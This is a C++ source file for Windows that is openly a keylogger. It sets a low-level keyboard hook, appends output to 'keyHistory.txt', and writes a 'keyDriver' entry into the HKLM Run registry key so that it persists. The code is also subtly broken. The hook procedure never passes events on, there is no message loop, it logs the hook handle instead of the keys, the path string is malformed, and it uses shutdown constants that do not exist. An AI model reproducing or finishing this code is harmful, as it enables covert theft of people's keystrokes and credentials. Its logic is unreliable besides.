#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
using namespace std;
//ifstream is to read from files
//ofstream is to write and append files

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
  // Intercept the WM_KEYDOWN message.
  if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
  {
    // Get the virtual key code.
    KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;
    int vkCode = ks->vkCode;

    // Do something with the keycode.
    // For example, you could print the keycode to the console.
    return vkCode;
  }
}

int main(){
    ifstream existCheck; //creating an ifstream object named file
    existCheck.open("keyHistory.txt"); //opening the file
    if (existCheck) //checking if the file exist, if it does the file would be opened, so we are checking if the file exists by opening it, else it wouldn't exist
    {
        //the file exists so it will be appended to instead
        ofstream keyRecorder;//ofstream variable keyRecorder is created to append data to file
        keyRecorder.open("keyHistory.txt",ios::app);//file is appended to be written to by the ofstream variable, file is called "keyHistory" and is a text file
        HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, GetCurrentThreadId());
        // Get the current state of the operating system.
        DWORD state = GetSystemMetrics(SM_SHUTTINGDOWN);

        // While the operating system is not shutting down, continue doing something.
        while (state != SHUTDOWN_RESTART && state != SHUTDOWN_POWEROFF) {
          // Do something.
          keyRecorder << hook;

          // Get the current state of the operating system again.
          state = GetSystemMetrics(SM_SHUTTINGDOWN);
        }

        // The operating system is shutting down or powering off.
        keyRecorder.close();
        return 0;
         
    }
    else
    {
        //the file doesn't exist and will be created and written to
        ofstream keyRecorder;//ofstream variable keyRecorder is created to write data to file
        keyRecorder.open("keyHistory.txt");//file is created to be written to by the ofstream variable, file is called "keyHistory" and is a text file
        
        HKEY hkey;
        LPCTSTR sk = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
        LPCTSTR value = TEXT("keyDriver");
        LPCTSTR data = TEXT("C:Keylogger\keyDriver.exe");

        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, sk, 0, KEY_ALL_ACCESS, &hkey) == ERROR_SUCCESS)
        {
            RegSetValueEx(hkey, value, 0, REG_SZ, (LPBYTE)data, sizeof(data));
            RegCloseKey(hkey);
        }
        // Create a hook for the WM_KEYDOWN message.
        HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, GetCurrentThreadId());

        // Get the current state of the operating system.
        DWORD state = GetSystemMetrics(SM_SHUTTINGDOWN);

        // While the operating system is not shutting down, continue doing something.
        while (state != SHUTDOWN_RESTART && state != SHUTDOWN_POWEROFF) {
          // Do something.
          keyRecorder << hook;

          // Get the current state of the operating system again.
          state = GetSystemMetrics(SM_SHUTTINGDOWN);
        }

        // The operating system is shutting down or powering off.
        keyRecorder.close();
        return 0;
        
    }
}